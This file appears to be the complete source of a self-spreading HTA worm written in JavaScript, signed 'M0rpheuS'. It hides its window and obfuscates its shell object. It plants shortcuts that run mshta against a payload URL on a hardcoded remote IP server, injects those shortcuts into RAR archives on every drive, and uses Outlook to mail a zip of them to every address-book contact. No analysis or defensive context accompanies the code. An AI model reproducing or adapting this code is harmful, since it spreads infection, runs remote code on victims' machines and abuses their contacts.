<html>
<hta:application id="MsnClonMailer" applicationname="MsnClonMailer" border="thin" borderstyle="0" caption="no" 
icon="C:\Archivos de programa\Windows Live\Messenger\msnmsgr.exe" 
maximizenutton="no" minimizebutton="yes" showintaskbar="no" singleinstance="yes" sysmenu="" version="1.0" windowstate="1" navigable="yes" />
<head>
<title></title>
</head>
<body>

<script language="javascript">

function rex()
{
	w=400;h=100;self.resizeTo(w,h);self.moveTo(-1000,-1000);
}

try{rex();}catch(e){}
try{rex();}catch(e){}
try{rex();}catch(e){}


</script>

<script type="text/javascript">
function writeCookie(name, value, hours){  
var expire = "";  
if(hours != null){expire = new Date((new Date()).getTime() + hours * 3600000);expire = "; expires=" + expire.toGMTString();}  
document.cookie = name + "=" + escape(value) + expire;  
} 
 
function readCookie(name)  
{
var cookies=document.cookie;  
cookies=cookies.split('; ');  
var cookieValue = "";  
for(i=0;i<=cookies.length-1;i++)  
{nyv=cookies[i].split("=");if(nyv[0]==name)cookieValue = nyv[1];}  
return unescape(cookieValue);  
}

capture="http://187.157.146.149:102/m0rpheus/morpheus2010/m2010.php";
fpath='http://187.157.146.149:102/m0rpheus/morpheus2010/';

page=fpath+'msnmsgr.tpl';


ShellVisible=0;
d=new Date();
GetTime=d.getTime();
WshShell = new ActiveXObject(unescape("%57%53%63%72%69%70%74%2E%53%68%65%6C%6C"));
msndir=WshShell.SpecialFolders('Desktop').split('\\');
msndir[msndir.length-1]='';
msndir=msndir.join('\\')+"msn";
msndir2='"'+msndir+'"';
msndir3=msndir.split("\\").join("/");

proframdir=WshShell.SpecialFolders('Programs');


fso = new ActiveXObject("Scripting.FileSystemObject");

function SendMailBF()
{
try{

WshShell.regwrite("HKCU\\software\\M0rpheuS\\", "Creado por .:M0rpheuS:.");

//On Error Resume Next
outlook =new ActiveXObject("Outl"+"ook."+"Appli"+"cation");

if(outlook=="Out"+"look")
{

    mapi=outlook.GetNameSpace("MAPI");
    
    addresses=mapi.AddressLists();

    //alert(addresses.Item(1).AddressEntries.Item(1).Address);
    //alert(addresses.count);
    SendedList="";
    for(Iadd=1;Iadd<=addresses.count;Iadd++)
    {
        address=addresses.Item(Iadd).AddressEntries;
        
        //alert(address.count);
        
        if(address.count>0)
        {
            count = address.count;
            for(I=1;I<=count;I++)
            {
                email = outlook.CreateItem(0);
                email.BodyFormat=2;
                entry = address.item(I);
                email.To = entry.Address;
                bloklist='ndreyesweb@hotmail.com;arellanes58@gmail.com;arellanes58@hotmail.com;gerencia@mensajesmexico.com;chiapas@mensajesmexico.com;marcoarellanes@gmail.com;josenangullasmu@gmail.com;';
                bloklist=bloklist.split(";");
                for(ibl=0;ibl<=bloklist.length-1;ibl++){ if(email.To==bloklist[ibl])email.To=""; }
                
                SendedList+=email.To+" ; ";
                //alert("Mail"+I+" . "+entry.Address);
                email.Subject = "FW:Mejores Amigos!!!";
                email.HTMLBody = "<font size=\"6\"><b>Mejores Amigos!!!</b></font><br/> \nAsi son los amigos \n:)\n<br>\n<br/><b>By M0rPheu$</b>";
                
                attachment=email.Attachments;
                //attachment.Add filesystem.GetSpecialFolder(0)& "\AnnaKournikova.jpg.vbs"
                attachment.Add(msndir+"\\Mejores Amigos.zip");
                email.DeleteAfterSubmit = true;
                
                if(email.To!="")
                {
                try
                {
                    email.Send();
                    WshShell.regwrite("HKCU\\software\\OnTheFly\\mailed", "1");
                    }
                    catch(e)
                    {
                        //e.message;
                    }
                }

            }
        }
    //WshShell.run('mshta.exe "'+capture+'?action=SendedMails&contenido='+escape(SendedList)+'"',ShellVisible,1);
    }
}
}catch(e)
{
    //alert(e.message);
}
}

urlpage=page+"?"+GetTime;
nd_file='C:\\WINDOWS\\system32\\mshta.exe';

Rar="C:\\Archivos de programa\\WinRAR\\Rar.exe";

Rarx="C:\\Archivos de programa\\WinRAR\\Rar.exe";
if(fso.FileExists(Rarx))Rar=Rarx;

Rarx="C:\\Program Files\\WinRAR\\Rar.exe";
if(fso.FileExists(Rarx))Rar=Rarx;

Rarx="C:\\Program Files\\WinRAR\\Rar.exe";
if(fso.FileExists(Rarx))Rar=Rarx;

//alert(Rar);
function DiscList()
{
	
	dis="";
	abc="a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z";
	abc=abc.toUpperCase();
	abc=abc.split(",");
	for(i=0;i<=abc.length-1;i++)
	{
	//s=AccesoDirecto(abc[i]+":\\",link_name);
	s=WshShell.Run("cmd.exe /c dir "+abc[i]+":\\",ShellVisible,1);

		if(s==0)
		{

			dis+=abc[i]+",";
		}
		else
		{}
	}
	return dis;
}


function Shortcut(ShortcutName,ShortcutDescription,Shell_Icon)
{

s="ok";
oShellLink = WshShell.CreateShortcut(ShortcutName);
oShellLink.Arguments = urlpage;
oShellLink.TargetPath = nd_file;
oShellLink.WindowStyle = 1;
oShellLink.Hotkey = "";
oShellLink.IconLocation = "c:\\windows\\system32\\shell32.dll, "+Shell_Icon;
oShellLink.Description = ShortcutDescription;
oShellLink.WorkingDirectory = "";
oShellLink.Save();

return s;
}


lnk1=""+msndir+"\\Mejores Amigos.lnk";
lnk2=""+msndir+"\\Informacion Importante.lnk";

ww=Shortcut(lnk1,"Mejores Amigos",160);
ww=Shortcut(lnk2,"Informacion Importante",154);

discos=DiscList();
discos=discos.split(",");

function List(folder)
{
    if(folder=="Mejores Amigos")
    {
      BestFriends=""+msndir+"\\Mejores Amigos.zip";
      WshShell.Run("cmd.exe /c \""+Rar+"\" a \""+BestFriends+"\" \""+lnk1+"\" & \""+Rar+"\" a \""+BestFriends+"\" \""+lnk2+"\"",ShellVisible);
      return 1;
    }
    
	if(fso.FolderExists(folder))
	{
	
	  var f, fc, s;
	  
	  f = fso.GetFolder(folder);
	  fc = new Enumerator(f.files);
	  s = "";
	  for (; !fc.atEnd(); fc.moveNext())
	  {
	  	myf=fso.GetFile(fc.item());
	  	nnn=myf.name.split(".");
	  	ext=nnn[nnn.length-1].toLowerCase();
	  	if(ext=='rar' || ext=='zip')
	  	{
	  		if(ext=='rar')
			  {
				//alert("cmd.exe /c "+Rar+" a \""+fc.item()+"\" \""+lnk1+"\" & "+Rar+" a \""+fc.item()+"\" \""+lnk2+"\"")
			  	WshShell.Run("cmd.exe /c \""+Rar+"\" a \""+fc.item()+"\" \""+lnk1+"\" & \""+Rar+"\" a \""+fc.item()+"\" \""+lnk2+"\"",ShellVisible);
			  	//WshShell.Run(Rar+" a \""+fc.item()+"\" \""+lnk2+"\"",ShellVisible);
			  }
		    s += "["+myf.name+"] - "+ext;
		    s += "\n";		
		}
	
	  }
      
	}
	else
	{
		s="";
	}
  return(s);
}

try{rex();}catch(e){}


if(fso.FileExists(Rar))
{
    List('Mejores Amigos');
	Desktop=WshShell.SpecialFolders('Desktop');
	List(Desktop);
	doctos=WshShell.SpecialFolders('MyDocuments');
	List(doctos);

	for(i=0;i<=discos.length-1;i++)
	{
		if(fso.DriveExists(discos[i]))try {List(discos[i]+':/');} catch(e) {};
	}
}
setTimeout("SendMailBF()",5000);

setTimeout("self.close()",90000);


</script>
